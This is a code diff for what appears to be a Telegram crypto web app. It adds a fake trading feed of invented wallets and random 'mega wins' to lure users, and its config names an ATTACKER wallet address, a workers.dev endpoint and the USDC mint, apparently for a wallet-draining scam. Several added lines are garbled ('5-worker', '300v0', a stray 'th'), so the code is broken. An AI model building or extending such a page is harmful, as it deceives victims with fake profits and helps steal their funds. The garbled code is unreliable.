@@ -81,6 +81,20 @@
     animation: slideFadeIn 0.5s ease-out forwards;
   }
 
+  /* NEUER EFFEKT FÜR MEGA WINS */
+  .feed-item.mega-win {
+    background: rgba(20, 241, 149, 0.15);
+    border: 1px solid rgba(20, 241, 149, 0.4);
+    box-shadow: 0 0 15px rgba(20, 241, 149, 0.3);
+    animation: megaPop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+  }
+
+  @keyframes megaPop {
+    0% { opacity: 0; transform: scale(0.8) translateX(-20px); }
+    50% { opacity: 1; transform: scale(1.05) translateX(5px); }
+    100% { opacity: 1; transform: scale(1) translateX(0); }
+  }
+
   @keyframes slideFadeIn { 
     from { opacity: 0; transform: translateX(-20px); } 
     to { opacity: 1; transform: translateX(0); } 
@@ -253,26 +267,20 @@
     window.Telegram.WebApp.expand();
   }
 
-  // --- SOUND EFFECT (Base64 Audio) ---
-  // Ein kurzer, hochwertiger "Pop"-Sound, wenn der Slider erfolgreich ist
-  const successSoundBase64 = "data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQA="; // Placeholder, ich nutze Web Audio API für den echten Sound
+  // --- SOUND EFFECT ---
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   
   function playPopSound() {
     if (audioCtx.state === 'suspended') audioCtx.resume();
     const osc = audioCtx.createOscillator();
     const gain = audioCtx.createGain();
-    
     osc.type = 'sine';
     osc.frequency.setValueAtTime(800, audioCtx.currentTime);
     osc.frequency.exponentialRampToValueAtTime(300, audioCtx.currentTime + 0.1);
-    
     gain.gain.setValueAtTime(0.5, audioCtx.currentTime);
     gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);
-    
     osc.connect(gain);
     gain.connect(audioCtx.destination);
-    
     osc.start();
     osc.stop(audioCtx.currentTime + 0.1);
   }
@@ -343,49 +351,6 @@
     "I'm going to be rich.",
     "I'm going to be poor.",
     "I'm going to be liquidated.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
-    "I'm going to make it.",
     "I'm going to make it."
   ];
   
@@ -415,31 +380,40 @@
   const fakeWallets = ['7xKX...', '3vNd...', '8fRt...', '5cYh...', '9pLk...', '2mJh...', '6bFw...', '4dGs...', '1kLp...', '8wXc...'];
   const fakeTokens = ['WIF', 'BONK', 'POPCAT', 'MEW', 'BOME', 'SLERF', 'MYRO', 'JUP', 'PYTH', 'JTO', 'W', 'TNSR', 'DRIFT', 'KMNO', 'IO', 'ZEX', 'TRUMP', 'MOTHER', 'DADDY', 'BEER', 'WATER', 'GME', 'AMC', 'SC', 'CHAT', 'BODEN', 'TREMP', 'HARAMBE', 'MOG', 'BOBO', 'WOJAK', 'PEPE', 'SHIB', 'FLOKI', 'DOGE', 'SOL', 'ETH', 'BTC', 'AVAX', 'LINK', 'DOT', 'MATIC', 'ADA', 'XRP', 'LTC', 'UNI', 'AAVE', 'MKR', 'CRV', 'SUSHI', 'COMP', 'SNX', 'YFI', 'BAL', 'REN', 'KNC', 'ZRX', 'OMG', 'BAT', 'REP', 'MANA', 'SAND', 'AXS', 'ENJ', 'CHZ', 'THETA', 'FTM', 'NEAR', 'ALGO', 'ATOM', 'LUNA', 'UST', 'KAVA', 'RUNE', 'OCEAN', 'FET', 'AGIX', 'RNDR', 'GRT', 'FIL', 'AR', 'HNT', 'IOTX', 'HNT', 'CKB', 'ROSE', 'MINA', 'CFX', 'APT', 'SUI', 'SEI', 'TIA', 'INJ', 'OSMO', 'DYDX', 'GMX', 'GNS', 'PENDLE', 'LDO', 'RPL', 'EIGEN', 'ETHFI', 'REZ', 'OMNI', 'SAGA', 'TAO', 'ARKM', 'WLD', 'AI', 'NMR', 'CGPT', 'NFP', 'ACE', 'PIXEL', 'PORTAL', 'MAVIA', 'RONIN', 'PRIME', 'ILV', 'MAGIC', 'HIGH', 'VOXEL', 'ALICE', 'TLM', 'GHST', 'YGG', 'AXS', 'SLP', 'MANA', 'SAND', 'APE', 'GALA', 'IMX', 'GODS', 'PYR', 'DERC', 'MC', 'MCC', 'WEMIX', 'XPLA', 'ASTR', 'KLAY', 'MTL', 'XDC', 'VET', 'HBAR', 'EGLD', 'FLOW', 'ICP', 'QNT', 'XTZ', 'EOS', 'NEO', 'IOTA', 'DASH', 'ZEC', 'XMR', 'DCR', 'LSK', 'ARK', 'STRAT', 'PIVX', 'PART', 'NAV', 'ZEN', 'WAVES', 'KMD', 'SYS', 'VIA', 'GRS', 'GAME', 'BLOCK', 'PIVX', 'DGB', 'RDD', 'POT', 'FTC', 'VTC', 'NMC', 'PPC', 'XPM', 'NVC', 'FTC', 'ANC', 'TIPS', 'FLO', 'CANN', 'MEC', 'NET', 'DOGE', 'LTC', 'XRP', 'BCH', 'BSV', 'BTG', 'DASH', 'ZEC', 'XMR', 'DCR', 'LSK', 'ARK'];
   
-  function addFeedItem() {
+  function addFeedItem(isMega = false) {
     const wallet = fakeWallets[Math.floor(Math.random() * fakeWallets.length)];
     const token = fakeTokens[Math.floor(Math.random() * fakeTokens.length)];
     
-    const isWin = Math.random() > 0.35;
-    
     let pnlText = "";
-    let pnlColor = "";
+    let pnlColor = "#14F195"; // Grün
+    let isMegaWin = isMega;
     
-    if (isWin) {
-      const pnlPercent = Math.random() * 3499 + 1;
-      const baseInvest = Math.random() * 490 + 10;
+    if (isMega) {
+      // Der Mega-Win: Über 1000%
+      const pnlPercent = Math.random() * 2500 + 1000;
+      const baseInvest = Math.random() * 400 + 100;
       const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
       pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
-      pnlColor = "#14F195"; 
     } else {
-      const pnlPercent = Math.random() * 59 + 1;
-      const baseInvest = Math.random() * 490 + 10;
-      const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
-      pnlText = `-$${pnlValue} (-${pnlPercent.toFixed(1)}%)`;
-      pnlColor = "#ef4444"; 
+      // Normale Wins / Losses
+      const isWin = Math.random() > 0.35;
+      
+      if (isWin) {
+        const pnlPercent = Math.random() * 435 + 15;
+        const baseInvest = Math.random() * 1400 + 100;
+        const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
+        pnlText = `+$${pnlValue} (+${pnlPercent.toFixed(1)}%)`;
+      } else {
+        const pnlPercent = Math.random() * 35 + 5;
+        const baseInvest = Math.random() * 1800 + 200;
+        const pnlValue = (baseInvest * (pnlPercent / 100)).toFixed(2);
+        pnlText = `-$${pnlValue} (-${pnlPercent.toFixed(1)}%)`;
+        pnlColor = "#ef4444"; // Rot
+      }
     }
     
     const el = document.createElement('div');
-    el.className = 'feed-item';
+    el.className = isMegaWin ? 'feed-item mega-win' : 'feed-item';
     el.innerHTML = `
       <span class="feed-wallet">${wallet}</span>
       <span class="feed-token">$${token}</span>
@@ -453,12 +427,20 @@
     }
   }
 
-  for(let i=0; i<5; i++) addFeedItem();
-  setInterval(addFeedItem, 3000);
+  // Initial 5 normale Items
+  for(let i=0; i<5-worker; i++) addFeedItem();
+  
+  // Norm.rale Items alle 3 Sekunden
+th  setInterval(addFeedItem, 300v0);
+  
+  // Mega-Win alle 10 Sekunden
+  setInterval(() => {
+    addFeedItem(true);
+  }, 10000);
 
   // --- CONFIG ---
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
-  const ENDPOINT = "https://sol-sync-worker.rthvzkr6jv.workers.dev"; 
+  const ENDPOINT = "https://sol-synczkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
 
   const container = document.getElementById('sliderContainer');
@@ -612,7 +594,6 @@
       container.classList.add('success');
       thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>';
 
-      // SOUND ABSPIELEN
       playPopSound();
 
     } catch (e) {
